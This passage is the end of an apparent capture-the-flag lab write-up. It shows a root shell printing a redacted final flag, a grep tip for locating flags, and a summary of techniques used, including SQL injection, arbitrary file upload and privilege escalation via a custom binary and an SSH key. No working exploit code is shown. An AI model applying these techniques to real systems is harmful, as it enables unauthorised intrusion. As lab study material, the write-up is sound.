home/zeus/user.flag:flag{Redacted}
Redacted/path:flag{Redacted}
```

```
root@olympus:/Redacted/path# cat Redacted_flag
Here is the final flag ! Congrats !

flag{Redacted}

As a reminder, here is a usefull regex :

grep -irl flag{

Hope you liked the room ;)
```

> Note 1: If you `grep` the hidden flag way too long, you can do it in `/etc` directory.
> Note 2: The `-o` option is to specify only nonempty parts of lines that match. `-r` to search recursively, `-E` to use regular expressions. (Learned from John Hammond's videos!)

# Conclusion

What we've learned:

1. Directory Enumeration
2. MySQL SQL Injection
3. Subdomain Enumeration
4. Cracking Hashes and Passphrase
5. Arbitrary File Upload
6. Privilege Escalation via a Custom Binary
7. Privilege Escalation via a Private SSH Key
8. Regular Expression